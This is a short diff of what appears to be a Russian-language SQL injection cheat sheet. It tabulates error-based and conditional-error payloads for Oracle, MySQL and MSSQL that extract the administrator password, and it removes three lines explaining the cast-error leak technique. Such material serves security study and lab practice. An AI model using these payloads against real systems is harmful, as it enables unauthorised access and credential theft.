@@ -212,7 +212,4 @@ TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::in
 | **Oracle** | `'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'` | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''` |
 | **MySQL** | `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` | `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--` |
 | **MSSQL** | `' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--` | `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1` |
-Подставляешь запрос с ::int.<br>
-Получаешь ошибку invalid input syntax for type integer: "значение".<br>
-Значение — это и есть искомые данные.<br>
 
